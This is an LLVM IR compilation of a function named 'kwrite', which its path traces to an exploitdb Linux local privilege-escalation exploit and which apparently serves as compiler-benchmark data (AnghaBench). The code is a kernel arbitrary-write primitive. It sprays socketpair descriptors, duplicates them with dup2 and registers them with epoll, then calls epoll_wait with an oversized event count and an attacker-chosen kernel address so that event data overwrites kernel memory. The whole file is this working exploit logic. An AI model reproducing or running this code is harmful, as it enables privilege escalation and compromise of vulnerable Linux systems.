; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_1397.c_kwrite.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_1397.c_kwrite.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.epoll_event = type { i32, i32 }

@.str = private unnamed_addr constant [35 x i8] c"[+] kwrite base %p, buf %p,num %d\0A\00", align 1
@EPOLLIN = common dso_local global i32 0, align 4
@EPOLLOUT = common dso_local global i32 0, align 4
@EPOLLPRI = common dso_local global i32 0, align 4
@EPOLLERR = common dso_local global i32 0, align 4
@EPOLLHUP = common dso_local global i32 0, align 4
@AF_UNIX = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@EPOLL_CTL_ADD = common dso_local global i32 0, align 4
@EPOLL_CTL_MOD = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [11 x i8] c"epoll_wait\00", align 1
@.str.3 = private unnamed_addr constant [33 x i8] c"This kernel not vulnerability!!!\00", align 1
@DIV = common dso_local global i32 0, align 4
@RES = common dso_local global i32 0, align 4
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 (i32, i8*, i32)* @kwrite to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @kwrite(i32 %0, i8* %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [2 x i32], align 4
  %13 = alloca %struct.epoll_event, align 4
  %14 = alloca i32*, align 8
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca %struct.epoll_event*, align 8
  %20 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 357913942, i32* %17, align 4
  %21 = load i32, i32* %5, align 4
  %22 = zext i32 %21 to i64
  %23 = inttoptr i64 %22 to i8*
  %24 = load i8*, i8** %6, align 8
  %25 = load i32, i32* %7, align 4
  %26 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0), i8* %23, i8* %24, i32 %25)
  %27 = call i32 @epoll_create(i32 4096)
  store i32 %27, i32* %8, align 4
  %28 = load i32, i32* %8, align 4
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

30:                                               ; preds = %3
  store i32 -1, i32* %4, align 4
  br label %199

31:                                               ; preds = %3
  %32 = load i32, i32* @EPOLLIN, align 4
  %33 = load i32, i32* @EPOLLOUT, align 4
  %34 = or i32 %32, %33
  %35 = load i32, i32* @EPOLLPRI, align 4
  %36 = or i32 %34, %35
  %37 = load i32, i32* @EPOLLERR, align 4
  %38 = or i32 %36, %37
  %39 = load i32, i32* @EPOLLHUP, align 4
  %40 = or i32 %38, %39
  %41 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %13, i32 0, i32 0
  store i32 %40, i32* %41, align 4
  %42 = load i32, i32* %7, align 4
  %43 = add nsw i32 %42, 11
  %44 = sdiv i32 %43, 12
  %45 = add nsw i32 %44, 4
  store i32 %45, i32* %16, align 4
  %46 = load i32, i32* %16, align 4
  %47 = add nsw i32 %46, 256
  %48 = sub nsw i32 %47, 1
  %49 = sdiv i32 %48, 256
  %50 = sext i32 %49 to i64
  %51 = mul i64 %50, 4
  %52 = trunc i64 %51 to i32
  %53 = call i32* @alloca(i32 %52)
  store i32* %53, i32** %14, align 8
  store i32 0, i32* %10, align 4
  br label %54

54:                                               ; preds = %79, %31
  %55 = load i32, i32* %10, align 4
  %56 = load i32, i32* %16, align 4
  %57 = add nsw i32 %56, 256
  %58 = sub nsw i32 %57, 1
  %59 = sdiv i32 %58, 256
  %60 = add nsw i32 %59, 1
  %61 = icmp slt i32 %55, %60
  br i1 %61, label %62, label %82

62:                                               ; preds = %54
  %63 = load i32, i32* @AF_UNIX, align 4
  %64 = load i32, i32* @SOCK_DGRAM, align 4
  %65 = getelementptr inbounds [2 x i32], [2 x i32]* %12, i64 0, i64 0
  %66 = call i64 @socketpair(i32 %63, i32 %64, i32 0, i32* %65)
  %67 = icmp slt i64 %66, 0
  br i1 %67, label %68, label %69

68:                                               ; preds = %62
  store i32 -1, i32* %4, align 4
  br label %199

69:                                               ; preds = %62
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %12, i64 0, i64 0
  %71 = load i32, i32* %70, align 4
  %72 = call i32 @send(i32 %71, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0), i32 1, i32 0)
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %12, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = load i32*, i32** %14, align 8
  %76 = load i32, i32* %10, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i32, i32* %75, i64 %77
  store i32 %74, i32* %78, align 4
  br label %79

79:                                               ; preds = %69
  %80 = load i32, i32* %10, align 4
  %81 = add nsw i32 %80, 1
  store i32 %81, i32* %10, align 4
  br label %54

82:                                               ; preds = %54
  %83 = getelementptr inbounds [2 x i32], [2 x i32]* %12, i64 0, i64 1
  %84 = load i32, i32* %83, align 4
  store i32 %84, i32* %11, align 4
  %85 = load i32, i32* %8, align 4
  %86 = load i32, i32* @EPOLL_CTL_ADD, align 4
  %87 = load i32, i32* %11, align 4
  %88 = call i32 @epoll_ctl(i32 %85, i32 %86, i32 %87, %struct.epoll_event* %13)
  store i32 0, i32* %10, align 4
  store i32 0, i32* %9, align 4
  br label %89

89:                                               ; preds = %117, %82
  %90 = load i32, i32* %10, align 4
  %91 = load i32, i32* %16, align 4
  %92 = sub nsw i32 %91, 1
  %93 = icmp slt i32 %90, %92
  br i1 %93, label %94, label %120

94:                                               ; preds = %89
  %95 = load i32*, i32** %14, align 8
  %96 = load i32, i32* %10, align 4
  %97 = sdiv i32 %96, 256
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i32, i32* %95, i64 %98
  %100 = load i32, i32* %99, align 4
  %101 = load i32, i32* %11, align 4
  %102 = add nsw i32 %101, 2
  %103 = load i32, i32* %10, align 4
  %104 = srem i32 %103, 256
  %105 = add nsw i32 %102, %104
  %106 = call i32 @dup2(i32 %100, i32 %105)
  store i32 %106, i32* %18, align 4
  %107 = load i32, i32* %18, align 4
  %108 = icmp slt i32 %107, 0
  br i1 %108, label %109, label %110

109:                                              ; preds = %94
  store i32 -1, i32* %4, align 4
  br label %199

110:                                              ; preds = %94
  %111 = load i32, i32* %8, align 4
  %112 = load i32, i32* @EPOLL_CTL_ADD, align 4
  %113 = load i32, i32* %18, align 4
  %114 = call i32 @epoll_ctl(i32 %111, i32 %112, i32 %113, %struct.epoll_event* %13)
  %115 = load i32, i32* %18, align 4
  %116 = call i32 @close(i32 %115)
  br label %117

117:                                              ; preds = %110
  %118 = load i32, i32* %10, align 4
  %119 = add nsw i32 %118, 1
  store i32 %119, i32* %10, align 4
  br label %89

120:                                              ; preds = %89
  store i32 0, i32* %10, align 4
  br label %121

121:                                              ; preds = %182, %120
  %122 = load i32, i32* %10, align 4
  %123 = load i32, i32* %7, align 4
  %124 = add nsw i32 %123, 7
  %125 = sdiv i32 %124, 8
  %126 = icmp slt i32 %122, %125
  br i1 %126, label %127, label %185

127:                                              ; preds = %121
  %128 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %13, i32 0, i32 1
  %129 = load i8*, i8** %6, align 8
  %130 = load i32, i32* %7, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8, i8* %129, i64 %131
  %133 = getelementptr inbounds i8, i8* %132, i64 -8
  %134 = load i32, i32* %10, align 4
  %135 = mul nsw i32 %134, 8
  %136 = sext i32 %135 to i64
  %137 = sub i64 0, %136
  %138 = getelementptr inbounds i8, i8* %133, i64 %137
  %139 = call i32 @memcpy(i32* %128, i8* %138, i32 8)
  %140 = load i32, i32* %8, align 4
  %141 = load i32, i32* @EPOLL_CTL_MOD, align 4
  %142 = load i32, i32* %11, align 4
  %143 = call i32 @epoll_ctl(i32 %140, i32 %141, i32 %142, %struct.epoll_event* %13)
  %144 = load i32, i32* %5, align 4
  %145 = load i32, i32* %7, align 4
  %146 = add i32 %144, %145
  %147 = load i32, i32* %10, align 4
  %148 = mul nsw i32 %147, 8
  %149 = sub i32 %146, %148
  %150 = load i32, i32* %16, align 4
  %151 = mul nsw i32 %150, 12
  %152 = sub i32 %149, %151
  %153 = zext i32 %152 to i64
  store i64 %153, i64* %15, align 8
  %154 = load i64, i64* %15, align 8
  %155 = inttoptr i64 %154 to %struct.epoll_event*
  store %struct.epoll_event* %155, %struct.epoll_event** %19, align 8
  %156 = load i32, i32* %8, align 4
  %157 = load i64, i64* %15, align 8
  %158 = inttoptr i64 %157 to i8*
  %159 = load i32, i32* %17, align 4
  %160 = call i32 @epoll_wait(i32 %156, i8* %158, i32 %159, i32 31337)
  store i32 %160, i32* %20, align 4
  %161 = load i32, i32* %20, align 4
  %162 = icmp eq i32 %161, -1
  br i1 %162, label %163, label %166

163:                                              ; preds = %127
  %164 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0))
  %165 = call i32 @fatal(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0))
  br label %166

166:                                              ; preds = %163, %127
  %167 = load i32, i32* %10, align 4
  %168 = icmp ne i32 %167, 0
  br i1 %168, label %169, label %181

169:                                              ; preds = %166
  %170 = load i32, i32* %8, align 4
  %171 = load i64, i64* %15, align 8
  %172 = inttoptr i64 %171 to i8*
  %173 = load i32, i32* %17, align 4
  %174 = call i32 @epoll_wait(i32 %170, i8* %172, i32 %173, i32 31337)
  store i32 %174, i32* %20, align 4
  %175 = load i32, i32* %20, align 4
  %176 = icmp eq i32 %175, -1
  br i1 %176, label %177, label %180

177:                                              ; preds = %169
  %178 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0))
  %179 = call i32 @fatal(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0))
  br label %180

180:                                              ; preds = %177, %169
  br label %181

181:                                              ; preds = %180, %166
  br label %182

182:                                              ; preds = %181
  %183 = load i32, i32* %10, align 4
  %184 = add nsw i32 %183, 1
  store i32 %184, i32* %10, align 4
  br label %121

185:                                              ; preds = %121
  %186 = load i32, i32* %8, align 4
  %187 = call i32 @close(i32 %186)
  store i32 3, i32* %10, align 4
  br label %188

188:                                              ; preds = %195, %185
  %189 = load i32, i32* %10, align 4
  %190 = load i32, i32* %11, align 4
  %191 = icmp sle i32 %189, %190
  br i1 %191, label %192, label %198

192:                                              ; preds = %188
  %193 = load i32, i32* %10, align 4
  %194 = call i32 @close(i32 %193)
  br label %195

195:                                              ; preds = %192
  %196 = load i32, i32* %10, align 4
  %197 = add nsw i32 %196, 1
  store i32 %197, i32* %10, align 4
  br label %188

198:                                              ; preds = %188
  store i32 0, i32* %4, align 4
  br label %199

199:                                              ; preds = %198, %109, %68, %30
  %200 = load i32, i32* %4, align 4
  ret i32 %200
}

declare dso_local i32 @printf(i8*, i8*, i8*, i32) #1

declare dso_local i32 @epoll_create(i32) #1

declare dso_local i32* @alloca(i32) #1

declare dso_local i64 @socketpair(i32, i32, i32, i32*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #1

declare dso_local i32 @dup2(i32, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @memcpy(i32*, i8*, i32) #1

declare dso_local i32 @epoll_wait(i32, i8*, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @fatal(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
